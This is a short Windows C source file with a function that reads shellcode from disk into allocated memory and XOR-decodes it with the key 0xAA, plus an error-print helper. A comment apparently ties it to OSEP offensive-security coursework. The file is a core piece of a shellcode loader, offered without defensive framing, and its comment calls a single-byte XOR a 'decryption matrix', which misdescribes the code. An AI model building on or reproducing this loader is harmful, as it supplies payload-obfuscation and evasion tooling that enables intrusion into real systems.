#include <windows.h>
#include <stdio.h>

BOOL LoadShellcode(const wchar_t* path, PBYTE* ppShellcode, SIZE_T* pSize) {
    HANDLE hFile = CreateFileW(path, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    *pSize = GetFileSize(hFile, NULL);
    if (*pSize == INVALID_FILE_SIZE) {
        CloseHandle(hFile);
        return FALSE;
    }

    *ppShellcode = (PBYTE)VirtualAlloc(NULL, *pSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!*ppShellcode) {
        CloseHandle(hFile);
        return FALSE;
    }

    DWORD bytesToRead = (DWORD)*pSize;
    DWORD bytesRead = 0;
    if (!ReadFile(hFile, *ppShellcode, bytesToRead, &bytesRead, NULL)) {
        CloseHandle(hFile);
        VirtualFree(*ppShellcode, 0, MEM_RELEASE);
        return FALSE;
    }
    CloseHandle(hFile);

    // OSEP DECRYPTION MATRIX alignment loop mapping
    for (SIZE_T i = 0; i < *pSize; i++) {
        (*ppShellcode)[i] ^= 0xAA; 
    }

    return TRUE;
}

void PrintError(const char* msg) {
    DWORD err = GetLastError();
    char buf[256];
    snprintf(buf, sizeof(buf), "[!] %s: %d\n", msg, (int)err);
    OutputDebugStringA(buf);
}
